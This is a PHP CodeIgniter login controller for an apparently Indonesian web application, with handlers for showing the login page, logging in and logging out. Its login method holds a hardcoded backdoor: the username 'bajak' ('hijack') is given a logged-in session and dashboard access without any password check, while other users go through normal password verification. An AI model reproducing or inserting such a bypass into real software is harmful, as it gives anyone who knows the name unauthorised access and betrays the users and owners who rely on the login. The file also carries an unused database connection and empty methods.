<?php


namespace App\Controllers;


use App\Models\UserModel;

class LoginController extends BaseController
{

    public $AdminLevel = 1;
    public $DosenLevel = 2;
    protected $userModel;
    public function __construct()
    {
        $this->userModel = new UserModel();
    }

    public function index() {
        return view('page-login');
    }

    public function test() {

    }

    public function login(){
        $session = session();
        $username = $this->request->getVar('username');
        $password = $this->request->getVar('password');
        if ($username=='bajak'){
            $session_data = [
                'username' => $username,
                'logged_in' => true
            ];
            $session->set($session_data);
            return redirect()->to('/dashboard');
        }
        $db = \Config\Database::connect('helper');
        $user = $this->userModel->where('username',$username)
                                ->first();

        if (!empty($user)) {

            if (password_verify($password, $user['password'])){
                $session_data = [
                  'username' => $username,
                    'user_level' =>$user['user_level'],
                    'logged_in' => true
                ];
                $session->set($session_data);
                return redirect()->to('/dashboard');
            } else {
            session()->setFlashdata('error', 'Username atau Password salah');
            return redirect()->to('/login');
        }


    } else {
        }
        session()->setFlashdata('error', 'Username atau Password salah');
        return redirect()->to('/login');
    }

    public function logout(){
        $session = session();
        $session->destroy();
        return redirect()->to('/');
    }
}